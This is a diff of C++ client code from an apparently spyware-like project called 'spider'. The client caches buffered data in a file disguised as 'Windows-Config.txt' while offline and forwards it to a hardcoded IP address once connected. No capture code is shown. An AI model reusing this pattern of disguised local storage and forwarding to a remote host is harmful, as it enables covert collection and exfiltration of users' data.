@@ -39,27 +39,23 @@ void spider::ClientProtocol::checkPing()
   isConnected.store(true);
   if (tmp.command->type == std::string("PING"))
   {
-    t_command tadaronne;
+    t_command cmd;
     std::time_t			ts;
     std::stringstream		ss;
 
-    tadaronne.type = "PONG";
+    cmd.type = "PONG";
     ts = std::time(nullptr);
     ss << ts;
-    tadaronne.data = ss.str();
-    sender.push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(tadaronne)));
+    cmd.data = ss.str();
+    sender.push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(cmd)));
   }
 }
 
-void	spider::ClientProtocol::sendData() {}
-
 void spider::runServerNetwork() {}
-
 
 void spider::runNetwork()
 {
   spider::ClientNetwork	_net("10.26.112.233", PORT);
-
 
   for (;;)
   {
@@ -79,30 +75,24 @@ void spider::ClientProtocol::run()
 {
   BufferSender &buf = BufferSender::BufferSenderInstance();
   std::fstream file;
-  std::string tmp;
 
-  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
+  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::ate);
   if (!file.is_open())
-    std::cout << "can't open the file" << std::endl;
-  else
-    std::cout << "open correctly" << std::endl;
+    file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
   for (;;)
   {
-    std::string str = buf.getBuf();
-
+    Sleep(500);
     this->checkPing();
     if (!isConnected.load())
     {
+      std::string str;
+      str = buf.getBuf();
       if (!str.empty())
 	file << str;
-      str.clear();
       continue;
     }
+    std::string tmp;
     getline(file, tmp);
-    tmp.append(str);
-    str = tmp;
-    buf.push(str);
-    str.clear();
-    tmp.clear();
+    buf.push(tmp);
   }
 }
